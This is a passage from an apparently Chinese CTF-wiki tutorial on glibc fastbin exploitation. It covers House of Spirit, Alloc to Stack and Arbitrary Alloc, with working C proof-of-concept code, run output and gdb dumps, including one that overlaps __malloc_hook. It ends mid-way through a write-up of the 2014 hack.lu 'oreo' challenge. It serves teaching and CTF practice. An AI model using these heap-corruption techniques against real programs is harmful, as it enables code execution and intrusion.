00:00 0                          [vdso]\nffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\n\u5df2\u653e\u5f03 (\u6838\u5fc3\u5df2\u8f6c\u50a8)\n\n\n_int_malloc \u4e2d\u7684\u6821\u9a8c\u5982\u4e0b\n\nif (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))\n    {\n      errstr = \nmalloc(): memory corruption (fast)\n;\n    errout:\n      malloc_printerr (check_action, errstr, chunk2mem (victim));\n      return NULL;\n}\n\n\n\n\u5c0f\u603b\u7ed3\n\n\n\u901a\u8fc7 fastbin double free \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u591a\u4e2a\u6307\u9488\u63a7\u5236\u540c\u4e00\u4e2a\u5806\u5757\uff0c\u8fd9\u53ef\u4ee5\u7528\u4e8e\u7be1\u6539\u4e00\u4e9b\u5806\u5757\u4e2d\u7684\u5173\u952e\u6570\u636e\u57df\u6216\u8005\u662f\u5b9e\u73b0\u7c7b\u4f3c\u4e8e\u7c7b\u578b\u6df7\u6dc6\u7684\u6548\u679c\u3002\n\u5982\u679c\u66f4\u8fdb\u4e00\u6b65\u4fee\u6539 fd \u6307\u9488\uff0c\u5219\u80fd\u591f\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5206\u914d\u5806\u5757\u7684\u6548\u679c( \u9996\u5148\u8981\u901a\u8fc7\u9a8c\u8bc1 )\uff0c\u8fd9\u5c31\u76f8\u5f53\u4e8e\u4efb\u610f\u5730\u5740\u5199\u4efb\u610f\u503c\u7684\u6548\u679c\u3002\n\n\nHouse Of Spirit\n\n\n\u4ecb\u7ecd\n\n\nHouse of Spirit \u662f \nthe Malloc Maleficarum\n \u4e2d\u7684\u4e00\u79cd\u6280\u672f\u3002\n\n\n\u8be5\u6280\u672f\u7684\u6838\u5fc3\u5728\u4e8e\u5728\u76ee\u6807\u4f4d\u7f6e\u5904\u4f2a\u9020 fastbin chunk\uff0c\u5e76\u5c06\u5176\u91ca\u653e\uff0c\u4ece\u800c\u8fbe\u5230\u5206\u914d\n\u6307\u5b9a\u5730\u5740\n\u7684 chunk \u7684\u76ee\u7684\u3002\n\n\n\u8981\u60f3\u6784\u9020 fastbin fake chunk\uff0c\u5e76\u4e14\u5c06\u5176\u91ca\u653e\u65f6\uff0c\u53ef\u4ee5\u5c06\u5176\u653e\u5165\u5230\u5bf9\u5e94\u7684 fastbin \u94fe\u8868\u4e2d\uff0c\u9700\u8981\u7ed5\u8fc7\u4e00\u4e9b\u5fc5\u8981\u7684\u68c0\u6d4b\uff0c\u5373\n\n\n\n\nfake chunk \u7684 ISMMAP \u4f4d\u4e0d\u80fd\u4e3a1\uff0c\u56e0\u4e3a free \u65f6\uff0c\u5982\u679c\u662f mmap \u7684 chunk\uff0c\u4f1a\u5355\u72ec\u5904\u7406\u3002\n\n\nfake chunk \u5730\u5740\u9700\u8981\u5bf9\u9f50\uff0c MALLOC_ALIGN_MASK\n\n\nfake chunk \u7684 size \u5927\u5c0f\u9700\u8981\u6ee1\u8db3\u5bf9\u5e94\u7684 fastbin \u7684\u9700\u6c42\uff0c\u540c\u65f6\u4e5f\u5f97\u5bf9\u9f50\u3002\n\n\nfake chunk \u7684 next chunk \u7684\u5927\u5c0f\u4e0d\u80fd\u5c0f\u4e8e \n2 * SIZE_SZ\n\uff0c\u540c\u65f6\u4e5f\u4e0d\u80fd\u5927\u4e8e\nav-\nsystem_mem\n \u3002\n\n\nfake chunk \u5bf9\u5e94\u7684 fastbin \u94fe\u8868\u5934\u90e8\u4e0d\u80fd\u662f\u8be5 fake chunk\uff0c\u5373\u4e0d\u80fd\u6784\u6210 double free \u7684\u60c5\u51b5\u3002\n\n\n\n\n\u81f3\u4e8e\u4e3a\u4ec0\u4e48\u8981\u7ed5\u8fc7\u8fd9\u4e9b\u68c0\u6d4b\uff0c\u53ef\u4ee5\u53c2\u8003 free \u90e8\u5206\u7684\u6e90\u7801\u3002\n\n\n\u6f14\u793a\n\n\n\u8fd9\u91cc\u5c31\u76f4\u63a5\u4ee5 how2heap \u4e0a\u7684\u4f8b\u5b50\u8fdb\u884c\u8bf4\u660e\uff0c\u5982\u4e0b\n\n\n#include\n \nstdio.h\n\n\n#include\n \nstdlib.h\n\n\n\nint\n \nmain\n()\n\n\n{\n\n    \nfprintf\n(\nstderr\n,\n \nThis file demonstrates the house of spirit attack.\n\\n\n);\n\n\n    \nfprintf\n(\nstderr\n,\n \nCalling malloc() once so that it sets up its memory.\n\\n\n);\n\n    \nmalloc\n(\n1\n);\n\n\n    \nfprintf\n(\nstderr\n,\n \nWe will now overwrite a pointer to point to a fake \nfastbin\n region.\n\\n\n);\n\n    \nunsigned\n \nlong\n \nlong\n \n*\na\n;\n\n    \n// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)\n\n    \nunsigned\n \nlong\n \nlong\n \nfake_chunks\n[\n10\n]\n \n__attribute__\n \n((\naligned\n \n(\n16\n)));\n\n\n    \nfprintf\n(\nstderr\n,\n \nThis region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n\\n\n,\n \nsizeof\n(\nfake_chunks\n),\n \nfake_chunks\n[\n1\n],\n \nfake_chunks\n[\n7\n]);\n\n\n    \nfprintf\n(\nstderr\n,\n \nThis chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (\n= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n\\n\n);\n\n    \nfprintf\n(\nstderr\n,\n \n... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n\\n\n);\n\n    \nfake_chunks\n[\n1\n]\n \n=\n \n0x40\n;\n \n// this is the size\n\n\n    \nfprintf\n(\nstderr\n,\n \nThe chunk.size of the *next* fake region has to be sane. That is \n 2*SIZE_SZ (\n 16 on x64) \n \n av-\nsystem_mem (\n 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n\\n\n);\n\n        \n// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8\n\n    \nfake_chunks\n[\n9\n]\n \n=\n \n0x1234\n;\n \n// nextsize\n\n\n    \nfprintf\n(\nstderr\n,\n \nNow we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n\\n\n,\n \nfake_chunks\n[\n1\n]);\n\n    \nfprintf\n(\nstderr\n,\n \n... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n\\n\n);\n\n    \na\n \n=\n \nfake_chunks\n[\n2\n];\n\n\n    \nfprintf\n(\nstderr\n,\n \nFreeing the overwritten pointer.\n\\n\n);\n\n    \nfree\n(\na\n);\n\n\n    \nfprintf\n(\nstderr\n,\n \nNow the next malloc will return the region of our fake chunk at %p, which will be %p!\n\\n\n,\n \nfake_chunks\n[\n1\n],\n \nfake_chunks\n[\n2\n]);\n\n    \nfprintf\n(\nstderr\n,\n \nmalloc(0x30): %p\n\\n\n,\n \nmalloc\n(\n0x30\n));\n\n\n}\n\n\n\n\n\n\u8fd0\u884c\u540e\u7684\u6548\u679c\u5982\u4e0b\n\n\n\u279c  how2heap git:\n(\nmaster\n)\n ./house_of_spirit \nThis file demonstrates the house of spirit attack.\nCalling malloc\n()\n once so that it sets up its memory.\nWe will now overwrite a pointer to point to a fake \nfastbin\n region.\nThis region \n(\nmemory of length: \n80\n)\n contains two chunks. The first starts at 0x7ffd9bceaa58 and the second at 0x7ffd9bceaa88.\nThis chunk.size of this region has to be \n16\n more than the region \n(\nto accomodate the chunk data\n)\n \nwhile\n still falling into the fastbin category \n(\n=\n \n128\n on x64\n)\n. The PREV_INUSE \n(\nlsb\n)\n bit is ignored by free \nfor\n fastbin-sized chunks, however the IS_MMAPPED \n(\nsecond lsb\n)\n and NON_MAIN_ARENA \n(\nthird lsb\n)\n bits cause problems.\n... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work \nfor\n the malloc parameter at the end. \nThe chunk.size of the *next* fake region has to be sane. That is \n \n2\n*SIZE_SZ \n(\n \n16\n on x64\n)\n \n \n av-\nsystem_mem \n(\n 128kb by default \nfor\n the main arena\n)\n to pass the nextsize integrity checks. No need \nfor\n fastbin size.\nNow we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffd9bceaa58.\n... note that the memory address of the *region* associated with this chunk must be \n16\n-byte aligned.\nFreeing the overwritten pointer.\nNow the next malloc will \nreturn\n the region of our fake chunk at 0x7ffd9bceaa58, which will be 0x7ffd9bceaa60!\nmalloc\n(\n0x30\n)\n: 0x7ffd9bceaa60\n\n\n\n\n\u5c0f\u603b\u7ed3\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u60f3\u8981\u4f7f\u7528\u8be5\u6280\u672f\u5206\u914d chunk \u5230\u6307\u5b9a\u5730\u5740\uff0c\u5176\u5b9e\u5e76\u4e0d\u9700\u8981\u4fee\u6539\u6307\u5b9a\u5730\u5740\u7684\u4efb\u4f55\u5185\u5bb9\uff0c\n\u5173\u952e\u662f\u8981\u80fd\u591f\u4fee\u6539\u6307\u5b9a\u5730\u5740\u7684\u524d\u540e\u7684\u5185\u5bb9\u4f7f\u5176\u53ef\u4ee5\u7ed5\u8fc7\u5bf9\u5e94\u7684\u68c0\u6d4b\n\u3002\n\n\nAlloc to Stack\n\n\n\u4ecb\u7ecd\n\n\n\u5982\u679c\u4f60\u5df2\u7ecf\u7406\u89e3\u4e86\u524d\u6587\u6240\u8bb2\u7684 Fastbin Double Free \u4e0e house of spirit \u6280\u672f\uff0c\u90a3\u4e48\u7406\u89e3\u8be5\u6280\u672f\u5c31\u5df2\u7ecf\u4e0d\u6210\u95ee\u9898\u4e86\uff0c\u5b83\u4eec\u7684\u672c\u8d28\u90fd\u5728\u4e8e fastbin \u94fe\u8868\u7684\u7279\u6027\uff1a\u5f53\u524d chunk \u7684 fd \u6307\u9488\u6307\u5411\u4e0b\u4e00\u4e2a chunk\u3002\n\n\n\u8be5\u6280\u672f\u7684\u6838\u5fc3\u70b9\u5728\u4e8e\u52ab\u6301 fastbin \u94fe\u8868\u4e2d chunk \u7684 fd \u6307\u9488\uff0c\u628a fd \u6307\u9488\u6307\u5411\u6211\u4eec\u60f3\u8981\u5206\u914d\u7684\u6808\u4e0a\uff0c\u4ece\u800c\u5b9e\u73b0\u63a7\u5236\u6808\u4e2d\u7684\u4e00\u4e9b\u5173\u952e\u6570\u636e\uff0c\u6bd4\u5982\u8fd4\u56de\u5730\u5740\u7b49\u3002\n\n\n\u6f14\u793a\n\n\n\u8fd9\u6b21\u6211\u4eec\u628a fake_chunk \u7f6e\u4e8e\u6808\u4e2d\u79f0\u4e3a stack_chunk\uff0c\u540c\u65f6\u52ab\u6301\u4e86 fastbin \u94fe\u8868\u4e2d chunk \u7684 fd \u503c\uff0c\u901a\u8fc7\u628a\u8fd9\u4e2a fd \u503c\u6307\u5411 stack_chunk \u5c31\u53ef\u4ee5\u5b9e\u73b0\u5728\u6808\u4e2d\u5206\u914d fastbin chunk\u3002\n\ntypedef struct _chunk\n{\n    long long pre_size;\n    long long size;\n    long long fd;\n    long long bk;  \n} CHUNK,*PCHUNK;\n\nint main(void)\n{\n    CHUNK stack_chunk;\n\n    void *chunk1;\n    void *chunk_a;\n\n    stack_chunk.size=0x21;\n    chunk1=malloc(0x10);\n\n    free(chunk1);\n\n    *(long long *)chunk1=\nstack_chunk;\n    malloc(0x10);\n    chunk_a=malloc(0x10);\n    return 0;\n}\n\n\n\u901a\u8fc7 gdb \u8c03\u8bd5\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u9996\u5148\u628a chunk1 \u7684 fd \u6307\u9488\u6307\u5411\u4e86 stack_chunk\n\n0x602000:   0x0000000000000000  0x0000000000000021 \n=== chunk1\n0x602010:   0x00007fffffffde60  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000020fe1 \n=== top chunk\n\n\n\u4e4b\u540e\u7b2c\u4e00\u6b21 malloc \u4f7f\u5f97 fastbin \u94fe\u8868\u6307\u5411\u4e86 stack_chunk\uff0c\u8fd9\u610f\u5473\u7740\u4e0b\u4e00\u6b21\u5206\u914d\u4f1a\u4f7f\u7528 stack_chunk \u7684\u5185\u5b58\u8fdb\u884c\n\n0x7ffff7dd1b20 \nmain_arena\n:    0x0000000000000000 \n=== unsorted bin\n0x7ffff7dd1b28 \nmain_arena+8\n:  0x00007fffffffde60 \n=== fastbin[0]\n0x7ffff7dd1b30 \nmain_arena+16\n: 0x0000000000000000  \n\n\n\u6700\u7ec8\u7b2c\u4e8c\u6b21malloc\u8fd4\u56de\u503c\u4e3a0x00007fffffffde70\u4e5f\u5c31\u662fstack_chunk\n\n   0x400629 \nmain+83\n        call   0x4004c0 \nmalloc@plt\n\n \u2192 0x40062e \nmain+88\n        mov    QWORD PTR [rbp-0x38], rax\n   $rax   : 0x00007fffffffde70\n\n0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst\n0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst\n0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst\n0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]\n0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- \n0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- \n0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- \n0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]\n0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]\n0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- \n0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]\n0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]\n\n\n\n\u5c0f\u603b\u7ed3\n\n\n\u901a\u8fc7\u8be5\u6280\u672f\u6211\u4eec\u53ef\u4ee5\u628a fastbin chunk \u5206\u914d\u5230\u6808\u4e2d\uff0c\u4ece\u800c\u63a7\u5236\u8fd4\u56de\u5730\u5740\u7b49\u5173\u952e\u6570\u636e\u3002\u8981\u5b9e\u73b0\u8fd9\u4e00\u70b9\u6211\u4eec\u9700\u8981\u52ab\u6301fastbin \u4e2d chunk \u7684 fd \u57df\uff0c\u628a\u5b83\u6307\u5230\u6808\u4e0a\uff0c\u5f53\u7136\u540c\u65f6\u9700\u8981\u6808\u4e0a\u5b58\u5728\u6709\u6ee1\u8db3\u6761\u4ef6\u7684size\u503c\u3002\n\n\nArbitrary Alloc\n\n\n\u4ecb\u7ecd\n\n\nArbitrary Alloc \u5176\u5b9e\u4e0e Alloc to stack \u662f\u5b8c\u5168\u76f8\u540c\u7684\uff0c\u552f\u4e00\u7684\u533a\u522b\u662f\u5206\u914d\u7684\u76ee\u6807\u4e0d\u518d\u662f\u6808\u4e2d\u3002\n\u4e8b\u5b9e\u4e0a\u53ea\u8981\u6ee1\u8db3\u76ee\u6807\u5730\u5740\u5b58\u5728\u5408\u6cd5\u7684 size \u57df\uff08\u8fd9\u4e2a size \u57df\u662f\u6784\u9020\u7684\uff0c\u8fd8\u662f\u81ea\u7136\u5b58\u5728\u7684\u90fd\u65e0\u59a8\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u628a chunk \u5206\u914d\u5230\u4efb\u610f\u7684\u53ef\u5199\u5185\u5b58\u4e2d\uff0c\u6bd4\u5982bss\u3001heap\u3001data\u3001stack\u7b49\u7b49\u3002\n\n\n\u6f14\u793a\n\n\n\u5728\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u4f7f\u7528\u5b57\u8282\u9519\u4f4d\u6765\u5b9e\u73b0\u76f4\u63a5\u5206\u914d fastbin \u5230\n_malloc_hook\u7684\u4f4d\u7f6e\uff0c\u76f8\u5f53\u4e8e\u8986\u76d6_malloc_hook\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u3002\n\n\nint main(void)\n{\n\n\n    void *chunk1;\n    void *chunk_a;\n\n    chunk1=malloc(0x60);\n\n    free(chunk1);\n\n \u00a0 \u00a0*(long long *)chunk1=0x7ffff7dd1af5-0x8;\n    malloc(0x60);\n    chunk_a=malloc(0x60);\n    return 0;\n}\n\n\n\u8fd9\u91cc\u76840x7ffff7dd1af5\u662f\u6211\u6839\u636e\u672c\u673a\u7684\u60c5\u51b5\u5f97\u51fa\u7684\u503c\uff0c\u8fd9\u4e2a\u503c\u662f\u600e\u4e48\u83b7\u5f97\u7684\u5462\uff1f\u9996\u5148\u6211\u4eec\u8981\u89c2\u5bdf\u6b32\u5199\u5165\u5730\u5740\u9644\u8fd1\u662f\u5426\u5b58\u5728\u53ef\u4ee5\u5b57\u8282\u9519\u4f4d\u7684\u60c5\u51b5\u3002\n\n0x7ffff7dd1a88 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1a90 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1a98 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1aa0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1aa8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ab0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ab8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ac0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ac8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ad0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ad8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ae0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ae8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0\n0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0\n0x7ffff7dd1b08 0x0  0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0\n0x7ffff7dd1b10 \n__malloc_hook\n: 0x30    0x28    0xa9    0xf7    0xff    0x7f    0x0 0x0\n\n\n0x7ffff7dd1b10 \u662f\u6211\u4eec\u60f3\u8981\u63a7\u5236\u7684 __malloc_hook \u7684\u5730\u5740\uff0c\u4e8e\u662f\u6211\u4eec\u5411\u4e0a\u5bfb\u627e\u662f\u5426\u53ef\u4ee5\u9519\u4f4d\u51fa\u4e00\u4e2a\u5408\u6cd5\u7684size\u57df\u3002\u56e0\u4e3a\u8fd9\u4e2a\u7a0b\u5e8f\u662f 64 \u4f4d\u7684\uff0c\u56e0\u6b64 fastbin \u7684\u8303\u56f4\u4e3a32\u5b57\u8282\u5230128\u5b57\u8282(0x20-0x80)\uff0c\u5982\u4e0b\uff1a\n\n//\u8fd9\u91cc\u7684size\u6307\u7528\u6237\u533a\u57df\uff0c\u56e0\u6b64\u8981\u5c0f2\u500dSIZE_SZ\nFastbins[idx=0, size=0x10] \nFastbins[idx=1, size=0x20] \nFastbins[idx=2, size=0x30] \nFastbins[idx=3, size=0x40] \nFastbins[idx=4, size=0x50] \nFastbins[idx=5, size=0x60] \nFastbins[idx=6, size=0x70] \n\n\n\u901a\u8fc7\u89c2\u5bdf\u53d1\u73b0 0x7ffff7dd1af5 \u5904\u53ef\u4ee5\u73b0\u5b9e\u9519\u4f4d\u6784\u9020\u51fa\u4e00\u4e2a0x000000000000007f\n\n0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0\n0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n\n0x7ffff7dd1af5 \n_IO_wide_data_0+309\n:   0x000000000000007f\n\n\n\u56e0\u4e3a 0x7f \u5728\u8ba1\u7b97 fastbin index \u65f6\uff0c\u662f\u5c5e\u4e8e index 5 \u7684\uff0c\u5373 chunk \u5927\u5c0f\u4e3a 0x70 \u7684\u3002\n\n\n##define fastbin_index(sz)                                                      \\\n\n\n    ((((unsigned int) (sz)) \n (SIZE_SZ == 8 ? 4 : 3)) - 2)\n\n\n\n\uff08\u6ce8\u610fsz\u7684\u5927\u5c0f\u662funsigned int\uff0c\u56e0\u6b64\u53ea\u53604\u4e2a\u5b57\u8282\uff09\n\n\n\u800c\u5176\u5927\u5c0f\u53c8\u5305\u542b\u4e86 0x10 \u7684 chunk_header\uff0c\u56e0\u6b64\u6211\u4eec\u9009\u62e9\u5206\u914d 0x60 \u7684 fastbin\uff0c\u5c06\u5176\u52a0\u5165\u94fe\u8868\u3002\n\u6700\u540e\u7ecf\u8fc7\u4e24\u6b21\u5206\u914d\u53ef\u4ee5\u89c2\u5bdf\u5230 chunk \u88ab\u5206\u914d\u5230 0x7ffff7dd1afd\uff0c\u56e0\u6b64\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236 \nmalloc_hook\u7684\u5185\u5bb9(\u5728\u6211\u7684libc\u4e2d\nrealloc_hook\u4e0e__malloc_hook\u662f\u5728\u8fde\u5728\u4e00\u8d77\u7684)\u3002\n\n\n0x4005a8 \nmain+66\n        call   0x400450 \nmalloc@plt\n\n \u2192   0x4005ad \nmain+71\n        mov    QWORD PTR [rbp-0x8], rax\n\n $rax   : 0x7ffff7dd1afd \n\n0x7ffff7dd1aed \n_IO_wide_data_0+301\n:   0xfff7dd0260000000  0x000000000000007f\n0x7ffff7dd1afd: 0xfff7a92e20000000  0xfff7a92a0000007f\n0x7ffff7dd1b0d \n__realloc_hook+5\n:  0x000000000000007f  0x0000000000000000\n0x7ffff7dd1b1d: 0x0000000000000000  0x0000000000000000\n\n\n\n\n\u5c0f\u603b\u7ed3\n\n\nArbitrary Alloc \u5728 CTF \u4e2d\u7528\u5730\u66f4\u52a0\u9891\u7e41\u3002\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5b57\u8282\u9519\u4f4d\u7b49\u65b9\u6cd5\u6765\u7ed5\u8fc7 size \u57df\u7684\u68c0\u9a8c\uff0c\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5206\u914d chunk\uff0c\u6700\u540e\u7684\u6548\u679c\u4e5f\u5c31\u76f8\u5f53\u4e8e\u4efb\u610f\u5730\u5740\u5199\u4efb\u610f\u503c\u3002\n\n\n2014 hack.lu oreo\n\n\n\u57fa\u672c\u5206\u6790\n\n\n\u279c  2014_Hack.lu_oreo git:\n(\nmaster\n)\n file oreo\noreo: ELF \n32\n-bit LSB executable, Intel \n80386\n, version \n1\n \n(\nSYSV\n)\n, dynamically linked, interpreter /lib/ld-linux.so.2, \nfor\n GNU/Linux \n2\n.6.26, BuildID\n[\nsha1\n]=\nf591eececd05c63140b9d658578aea6c24450f8b, stripped\n\u279c  2014_Hack.lu_oreo git:\n(\nmaster\n)\n checksec oreo         \n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_spirit/2014_Hack.lu_oreo/oreo\n\n    Arch:     i386-32-little\n    RELRO:    No RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u786e\u5b9e\u662f\u6bd4\u8f83\u8001\u7684\uff0c32\u4f4d\u7a0b\u5e8f\uff0c\u52a8\u6001\u94fe\u63a5\uff0c\u5c31\u8fde RELRO \u6280\u672f\u4e5f\u6ca1\u6709\u4e0a\u3002\n\n\n\u57fa\u672c\u529f\u80fd\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8be5\u7a0b\u5e8f\u5e76\u6ca1\u6709\u8fdb\u884c setvbuf \u64cd\u4f5c\uff0c\u56e0\u6b64\u5728\u521d\u6b21\u6267\u884c io \u51fd\u6570\u65f6\uff0c\u4f1a\u5728\u5806\u4e0a\u5206\u914d\u7a7a\u95f4\u3002\n\n\n\u6b63\u5982\u7a0b\u5e8f\u4e2d\u76f4\u63a5\u8f93\u51fa\u7684\u4fe1\u606f\uff0c\u7a0b\u5e8f\u4e3b\u8981\u662f\u4e00\u4e2a\u539f\u59cb\u7684\u5728\u7ebf\u67aa\u652f\u7cfb\u7edf\u3002\u5176\u4e2d\uff0c\u6839\u636e\u6dfb\u52a0\u67aa\u652f\u7684\u8fc7\u7a0b\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u67aa\u652f\u7684\u57fa\u672c\u7ed3\u6784\u5982\u4e0b\n\n\n00000000\n \nrifle\n           \nstruc\n \n;\n \n(\nsizeof\n=\n0x38\n,\n \nmappedto_5\n)\n\n\n00000000\n \ndescript\n        \ndb\n \n25\n \ndup\n(\n?\n)\n\n\n0000001\n9\n \nname\n            \ndb\n \n27\n \ndup\n(\n?\n)\n\n\n00000034\n \nnext\n            \ndd\n \n?\n                    \n;\n \noffset\n\n\n0000003\n8\n \nrifle\n           \nends\n\n\n\n\n\n\u7a0b\u5e8f\u7684\u57fa\u672c\u529f\u80fd\u5982\u4e0b\n\n\n\n\n\u6dfb\u52a0\u67aa\u652f\uff0c\u5176\u4e3b\u8981\u4f1a\u8bfb\u53d6\u67aa\u652f\u7684\u540d\u5b57\u4e0e\u63cf\u8ff0\u3002\u4f46\u95ee\u9898\u5728\u4e8e\u8bfb\u53d6\u7684\u540d\u5b57\u7684\u957f\u5ea6\u8fc7\u957f\uff0c\u53ef\u4ee5\u8986\u76d6 next \u6307\u9488\u4ee5\u53ca\u540e\u9762\u5806\u5757\u7684\u6570\u636e\u3002\u53ef\u4ee5\u8986\u76d6\u540e\u9762\u5806\u5757\u7684\u6570\u636e\u5927\u5c0f\u4e3a 56-(56-27)=27 \u5927\u5c0f\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e9b\u67aa\u652f\u7684\u5927\u5c0f\u90fd\u662f\u5728fastbin \u8303\u56f4\u5185\u7684\u3002\n\n\n\u5c55\u793a\u6dfb\u52a0\u67aa\u652f\uff0c\u5373\u4ece\u5934\u5230\u5c3e\u8f93\u51fa\u67aa\u652f\u7684\u63cf\u8ff0\u4e0e\u540d\u5b57\u3002\n\n\n\u8ba2\u5df2\u7ecf\u9009\u62e9\u7684\u67aa\u652f\uff0c\u5373\u5c06\u6240\u6709\u5df2\u7ecf\u6dfb\u52a0\u7684\u67aa\u652f\u91ca\u653e\u6389\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u7f6e\u4e3aNULL\u3002\n\n\n\u7559\u4e0b\u8ba2\u8d27\u6d88\u606f\n\n\n\u5c55\u793a\u76ee\u524d\u72b6\u6001\uff0c\u5373\u6dfb\u52a0\u4e86\u591a\u5c11\u53ea\u67aa\uff0c\u8ba2\u4e86\u591a\u5c11\u5355\uff0c\u7559\u4e0b\u4e86\u4ec0\u4e48\u4fe1\u606f\u3002\n\n\n\n\n\u4e0d\u96be\u5206\u6790\u5f97\u5230\uff0c\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u4e3b\u8981\u5b58\u5728\u4e8e\u6dfb\u52a0\u67aa\u652f\u65f6\u7684\u5806\u6ea2\u51fa\u6f0f\u6d1e\u3002\n\n\n\u5229\u7528\n\n\n\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u7531\u4e8e\u7a0b\u5e8f\u5b58\u5728\u5806\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u800c\u4e14\u8fd8\u53ef\u4ee5\u63a7\u5236 next \u6307\u9488\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236 next \u6307\u9488\u6307\u5411\u7a0b\u5e8f\u4e2d got 